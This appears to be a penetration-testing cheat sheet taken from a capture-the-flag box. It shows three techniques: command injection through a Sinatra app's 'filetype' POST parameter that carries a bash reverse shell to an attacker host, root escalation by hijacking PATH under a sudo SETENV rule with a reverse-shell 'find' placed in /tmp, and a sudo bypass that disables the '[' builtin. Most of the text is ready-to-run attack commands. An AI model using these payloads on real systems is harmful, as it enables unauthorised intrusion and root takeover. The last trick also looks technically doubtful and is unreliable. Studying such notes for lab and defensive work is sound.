# Ruby Sinatra — Command Injection via URL Parameter

When a Sinatra/Ruby app passes user-supplied parameters to system commands (e.g. image processing with ImageMagick), inject via URL-encoded special characters.

```bash
# Credentials often exposed in JS files loaded by the page:
curl http://<TARGET>/photobomb.js | grep -i pass

# The injection parameter is typically in a POST form (e.g. file download or processing)
# Look for parameters like: filetype, format, filename, dimensions

# Inject reverse shell via URL-encoded semicolon in filetype/format param:
curl -s -X POST http://<TARGET>/printer \
  -u '<USER>:<PASS>' \
  --data-urlencode "photo=sample.jpg" \
  --data-urlencode "filetype=jpg;bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" \
  --data-urlencode "dimensions=3000x2000"
```

## sudo ENV + PATH hijack (SETENV)

If a sudo rule allows keeping environment variables (`SETENV`) and calls a command without full path:
```bash
# Check sudo -l for SETENV and relative path:
# User may run (root) SETENV: /opt/cleanup.sh
# cleanup.sh calls: find . -exec ...

# Hijack 'find' in PATH:
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /tmp/find
chmod +x /tmp/find
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

## Bash builtin disable bypass (sudo with `[`)

```bash
# If sudo rule uses bash built-in [ (test) which can be disabled:
sudo /bin/bash -c 'enable -n [; /bin/bash'
# Disabling [ prevents the script from checking conditions → drops to a shell
```
